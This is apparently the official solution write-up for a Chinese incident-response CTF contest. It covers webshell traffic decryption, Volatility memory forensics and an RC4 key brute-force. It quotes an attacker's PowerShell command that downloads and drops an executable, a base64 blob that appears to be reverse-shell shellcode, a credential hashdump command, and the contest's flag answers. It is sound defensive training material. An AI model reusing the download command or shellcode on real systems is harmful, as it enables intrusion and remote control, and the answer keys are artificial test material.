# 【官方WP】第一届solar杯·应急响应挑战赛官方题解

> 原文: https://www.ctfiot.com/222532.html
> ID: 222532

就在几天前，第一届Solar杯·应急响应挑战赛圆满落下帷幕。这场比赛汇聚了来自全国的网络安全精英，选手们在激烈的技术较量中展现了非凡的能力和智慧。为延续比赛的技术交流与分享精神，我们很高兴向大家呈现本次比赛的官方WP（Writeup）。本篇官方WP将深入解析比赛中的关键赛题，从流量分析到勒索病毒破解，逐步还原真实案例中的技术细节与解决思路。
       需要特别说明的是，文中所呈现的这些方法和思路，均基于真实应急响应场景设计，虽然可能并非所有情况下的最优解，但我们希望它们能够为您提供有价值的参考，助力您在未来的应急响应中更加高效地应对复杂多变的安全挑战。让我们一同走进这场技术盛宴，探索网络安全应急响应的更多可能！

1.流量分析

1.1 文件排查

新手运维小王的Geoserver遭到了攻击：

黑客疑似删除了webshell后门，小王找到了可能是攻击痕迹的文件但不一定是正确的，请帮他排查一下。

从日志分析得知攻击者IP为 10.0.100.22 对该站点有目录扫描行为与 b.jsp 交互频繁疑似为上传webshell。

当访问 JSP 页面时，Tomcat 会根据 JSP 页面动态生成一个 Java 类（.java），然后将其编译为 .class 文件。生成的 .class 文件是 Tomcat 用来处理请求并返回响应的实际代码。这个过程是动态的，Tomcat 会在后台管理这些文件的编译和更新。路径一般为：

<Tomcat_home>/work/Catalina/<host>/<webapp>/org/apache/jsp/

新手运维小王的Geoserver遭到了攻击：

小王拿到了当时被入侵时的流量，其中一个IP有访问webshell的流量，已提取部分放在了两个pcapng中了。请帮他解密该流量。

通过利用webshell文件中的xc作为解密密钥，对流量进行解密，通过筛选排查可发现攻击者查看了flag文件

新手运维小王的Geoserver遭到了攻击：

小王拿到了当时被入侵时的流量，黑客疑似通过webshell上传了文件，请看看里面是什么。
使用流量解密工具进行解密流量并删除无用部分后另存为pdf。

说明：由于黑客在攻击时可能会修改用户口令、锁定登陆、破坏系统导致无法进入操作系统，因此本题不提供密码

PE镜像下载地址

https://www.hotpe.top/download/

powershell -c iwr -uri http://10.0.100.85:81/2.exe -o C:/windows/tasks/2.exe

24/12/18 16:37:14 攻击者使用 333.exe 工具使 10.0.11.6 与 10.0.11.10 进行tcp连接


```
<Tomcat_home>/work/Catalina/<host>/<webapp>/org/apache/jsp/
f!l^a*g{A7b4_X9zK_2v8N_wL5q4}
flag{sA4hP_89dFh_x09tY_lL4SI4}
flag{dD7g_jk90_jnVm_aPkcs}
flag{2024/12/16 15:24:21}
flag{xmrig.exe}
flag{203.107.45.167}
flag{E4r5t5y6Mhgur89g}
import base64

base64_data = '''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'''
padding = '=' * (4 - len(base64_data) % 4)
base64_data += padding
compressed_data = base64.b64decode(base64_data)
with open("output.gz", "wb") as f:
    f.write(compressed_data)
print("保存成功")
import base64

base64_data = "/EiD5PDozAAAAEFRQVBSUUgx0lZlSItSYEiLUhhIi1IgTTHJSItyUEgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBJAdBQ41ZI/8lNMclBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVheSAHQWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAG9wKiu3EFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V"
padding = '=' * (4 - len(base64_data) % 4)
base64_data += padding
decoded_data = base64.b64decode(base64_data)
with open('data.bin', 'wb') as file:
    file.write(decoded_data)
print("保存成功")
flag{d72000ee7388d7d58960db277a91cc40}
volatility_2.6_win64_standalone.exe -f SERVER-2008-20241220-162057.raw imageinfo
volatility_2.6_win64_standalone.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 netscan
flag{192.168.60.220}
volatility_2.6_win64_standalone.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 cmdscan
flag{155.94.204.67}
volatility_2.6_win64_standalone.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 filescan | findstr "pass.txt"
volatility_2.6_win64_standalone.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007e4cedd0 -D C:
data
flag{GalaxManager_2012}
volatility_2.6_win64_standalone.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 filescan | findstr "Security.evtx"
volatility_2.6_win64_standalone.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007e744ba0 -D C:
data
flag{ASP.NET}
flag{2024/12/21 0:15:34}
volatility_2.6_win64_standalone.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 hashdump
flag{5ffe97489cbec1e08d0c6339ec39416d}
for i in 0..256 {
    j = (j + s[i]  + key[i % key.len()] ) % 256;
    s.swap(i, j);
}
import itertools
import os
from concurrent.futures.thread import ThreadPoolExecutor

def rc4(key, data):
    key_length = len(key)
    S = list(range(256))
    j = 0

    for i in range(256):
        j = (j + S[i] + key[i % key_length]) % 256
        S[i], S[j] = S[j], S[i]

    i = 0
    j = 0
    result = []
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) % 256]
        result.append(byte ^ K)

    return result

def is_printable(data):
    try:
        return all(32 <= byte <= 126 for byte in data)
    
except TypeError:
        return False

ciphertext = []#加密后的数据

def run(key_tuple ):
    key = list(key_tuple)
    decrypted_data = rc4(key, ciphertext)
    # 判断是否解密后的数据是可打印的
    if is_printable(decrypted_data):
        decrypted_string = ''.join(chr(byte) for byte in decrypted_data)
        if 'flag' in decrypted_string:
            print(f"找到有效密钥: {key} -> 解密结果: {decrypted_string}")
max_threads = os.cpu_count()*2
print(max_threads)
with ThreadPoolExecutor(max_workers=max_threads) as executor:
    executor.map(run, itertools.product(range(0, 10), repeat=6))
powershell -c iwr -uri http://10.0.100.85:81/2.exe -o C:/windows/tasks/2.exe
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/3-1736081049.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/10-1736081051.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/9-1736081052.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/6-1736081052.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/4-1736081053.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/5-1736081055.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/0-1736081055.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/2-1736081057.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/10-1736081059.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/1-1736081059.png)